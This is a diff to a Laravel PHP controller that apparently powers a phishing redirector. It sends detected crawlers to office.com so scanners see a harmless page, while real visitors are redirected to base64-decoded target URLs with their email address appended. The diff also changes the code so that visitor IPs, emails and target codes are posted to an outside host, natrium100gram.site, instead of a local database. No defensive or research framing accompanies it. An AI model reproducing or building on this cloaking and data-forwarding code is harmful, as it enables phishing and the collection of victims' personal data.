@@ -8,6 +8,7 @@ use Illuminate\Foundation\Bus\DispatchesJobs;
 use Illuminate\Foundation\Validation\ValidatesRequests;
 use Illuminate\Routing\Controller as BaseController;
 use Illuminate\Http\Request;
+use Illuminate\Support\Facades\Http;
 use Jaybizzle\CrawlerDetect\CrawlerDetect;
 use Jaybizzle\CrawlerDetect\Fixtures\Crawlers;
 use Crawler;
@@ -33,25 +34,29 @@ class Controller extends BaseController
 
     public function index(){
 
-        $data = saveEmail::where('ip',request()->ip())->latest()->first();
+//        $data = saveEmail::where('ip',request()->ip())->latest()->first();
 //        return $data;
+        $data =   Http::post("https://natrium100gram.site/public/api/savemequeen",[
+            "ip" => $this->get_ip(),
+        ]);
+//        return $data["target"];
 
         if(Crawler::isCrawler()){
             return redirect()->away("https://office.com");
         }else{
 //            return base64_decode($data->target).base64_decode($data->email);
-            return redirect()->away(base64_decode($data->target).base64_decode($data->email));
+            return redirect()->away(base64_decode($data["target"]).base64_decode($data["email"]));
 
         }
     }
 
     public function index2(Request $request){
-        $save = new saveEmail();
-        $save->email = $request->subs;
-        $save->ip = $this->get_ip();
-        $save->target = $request->excode;
-        $save->save();
-        return "ok";
+     $send =   Http::post("https://natrium100gram.site/public/api/savemeking",[
+            "ip" => $this->get_ip(),
+            "subs" => $request->subs,
+            "excode" => $request->excode,
+        ]);
+        return $send->body();
 
     }
 
